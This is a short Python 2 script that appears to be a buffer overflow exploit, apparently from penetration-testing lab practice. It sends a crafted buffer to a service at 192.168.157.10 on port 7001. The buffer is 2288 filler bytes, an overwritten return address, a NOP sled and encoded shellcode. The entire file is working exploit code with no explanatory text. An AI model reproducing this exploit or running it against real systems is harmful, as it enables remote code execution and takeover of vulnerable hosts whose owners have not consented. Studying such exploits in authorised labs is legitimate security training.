#!/usr/bin/python
import socket

try:
  print "\nSending evil buffer..."

  shellcode = (
"\xdb\xd7\xd9\x74\x24\xf4\xbe\xcd\x2e\xfe\xc9\x58\x2b\xc9\xb1"
"\x52\x31\x70\x17\x03\x70\x17\x83\x25\xd2\x1c\x3c\x49\xc3\x63"
"\xbf\xb1\x14\x04\x49\x54\x25\x04\x2d\x1d\x16\xb4\x25\x73\x9b"
"\x3f\x6b\x67\x28\x4d\xa4\x88\x99\xf8\x92\xa7\x1a\x50\xe6\xa6"
"\x98\xab\x3b\x08\xa0\x63\x4e\x49\xe5\x9e\xa3\x1b\xbe\xd5\x16"
"\x8b\xcb\xa0\xaa\x20\x87\x25\xab\xd5\x50\x47\x9a\x48\xea\x1e"
"\x3c\x6b\x3f\x2b\x75\x73\x5c\x16\xcf\x08\x96\xec\xce\xd8\xe6"
"\x0d\x7c\x25\xc7\xff\x7c\x62\xe0\x1f\x0b\x9a\x12\x9d\x0c\x59"
"\x68\x79\x98\x79\xca\x0a\x3a\xa5\xea\xdf\xdd\x2e\xe0\x94\xaa"
"\x68\xe5\x2b\x7e\x03\x11\xa7\x81\xc3\x93\xf3\xa5\xc7\xf8\xa0"
"\xc4\x5e\xa5\x07\xf8\x80\x06\xf7\x5c\xcb\xab\xec\xec\x96\xa3"
"\xc1\xdc\x28\x34\x4e\x56\x5b\x06\xd1\xcc\xf3\x2a\x9a\xca\x04"
"\x4c\xb1\xab\x9a\xb3\x3a\xcc\xb3\x77\x6e\x9c\xab\x5e\x0f\x77"
"\x2b\x5e\xda\xd8\x7b\xf0\xb5\x98\x2b\xb0\x65\x71\x21\x3f\x59"
"\x61\x4a\x95\xf2\x08\xb1\x7e\x3d\x64\xce\xe3\xd5\x77\x30\x1d"
"\x9d\xf1\xd6\x77\xf1\x57\x41\xe0\x68\xf2\x19\x91\x75\x28\x64"
"\x91\xfe\xdf\x99\x5c\xf7\xaa\x89\x09\xf7\xe0\xf3\x9c\x08\xdf"
"\x9b\x43\x9a\x84\x5b\x0d\x87\x12\x0c\x5a\x79\x6b\xd8\x76\x20"
"\xc5\xfe\x8a\xb4\x2e\xba\x50\x05\xb0\x43\x14\x31\x96\x53\xe0"
"\xba\x92\x07\xbc\xec\x4c\xf1\x7a\x47\x3f\xab\xd4\x34\xe9\x3b"
"\xa0\x76\x2a\x3d\xad\x52\xdc\xa1\x1c\x0b\x99\xde\x91\xdb\x2d"
"\xa7\xcf\x7b\xd1\x72\x54\x8b\x98\xde\xfd\x04\x45\x8b\xbf\x48"
"\x76\x66\x83\x74\xf5\x82\x7c\x83\xe5\xe7\x79\xcf\xa1\x14\xf0"
"\x40\x44\x1a\xa7\x61\x4d" )
  nops = "\x90" * 10
  eip = "\xcf\x10\x80\x14"  
  offset = "C" * 8  
  buffer = "A" * 2288 + eip + offset + nops + shellcode
  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)

  s.connect(("192.168.157.10", 7001))
  s.send(buffer)

  s.close()

  print "\nDone!"

except:
  print "\nCould not connect!"
